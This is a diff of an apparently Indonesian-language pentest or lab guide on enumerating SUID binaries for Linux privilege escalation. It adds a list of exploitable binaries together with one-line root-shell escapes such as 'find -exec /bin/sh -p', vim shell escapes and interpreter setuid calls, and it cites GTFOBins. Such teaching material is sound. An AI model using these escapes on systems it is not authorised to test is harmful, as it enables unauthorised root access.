@@ -30,21 +30,41 @@ Tampilan **aman** (binary SUID wajar, tidak bisa diabuse):
 ```text
 /usr/bin/passwd          ← wajar, passwd memang butuh SUID
 /usr/bin/sudo            ← wajar, sudo memang butuh SUID
-/usr/bin/mount           ← wajar, mount butuh privilege
-/usr/bin/su              ← wajar, su memang butuh SUID
 ```
+
+> `mount`, `su`, `chsh`, `chfn`, `newgrp`, `gpasswd` juga wajar — abaikan semuanya, fokus cari binary yang bisa spawn shell.
 
 Tampilan **rentan** (ada binary SUID yang bisa spawn shell):
 
 ```text
 www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null
-/usr/bin/passwd          ← wajar, passwd memang butuh SUID
-/usr/bin/sudo            ← wajar, sudo memang butuh SUID
-/usr/bin/mount           ← wajar, mount butuh privilege
-/usr/bin/find            ← RENTAN! find bisa -exec shell
-/usr/bin/vim             ← RENTAN! vim bisa shell escape
-/usr/bin/python3.11      ← RENTAN! interpreter bisa setuid(0)
+
+# --- shell langsung ---
+/usr/bin/env               ← RENTAN! env /bin/sh -p
+/usr/bin/bash              ← RENTAN! bash -p
+/usr/bin/find              ← RENTAN! -exec /bin/sh -p
+/usr/bin/xargs             ← RENTAN! xargs /bin/sh -p
+/usr/bin/time              ← RENTAN! time /bin/sh -p
+/usr/bin/timeout           ← RENTAN! timeout 0 /bin/sh -p
+
+# --- editor & pager (shell escape) ---
+/usr/bin/vim               ← RENTAN! :!/bin/sh -p
+/usr/bin/less              ← RENTAN! !/bin/sh -p
+/usr/bin/more              ← RENTAN! !/bin/sh -p
+/usr/bin/man               ← RENTAN! man membuka pager less/more
+/usr/bin/journalctl        ← RENTAN! output panjang dibuka via pager
+
+# --- interpreter (spawn shell via script) ---
+/usr/bin/python3           ← RENTAN! os.setuid(0) + exec shell
+/usr/bin/perl              ← RENTAN! setuid(0) + exec shell
+/usr/bin/ruby              ← RENTAN! Process.setuid(0) + exec
+/usr/bin/node              ← RENTAN! process.setuid(0) + spawn
+/usr/bin/php               ← RENTAN! exec shell via script
+/usr/bin/lua               ← RENTAN! os.execute("/bin/sh -p")
+/usr/bin/awk               ← RENTAN! system("/bin/sh -p")
 ```
+
+> **Catatan:** Daftar di atas difokuskan hanya ke binary yang **langsung memberi shell**. Binary lain seperti `cp`, `tee`, `tar`, `zip`, `wget`, `curl`, `docker`, `nmap` tetap bisa diabuse (menimpa/membaca file sistem) — daftar lengkapnya di GTFOBins → bagian **SUID**. Cukup **satu** entry RENTAN untuk mendapatkan root shell.
 
 Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
 
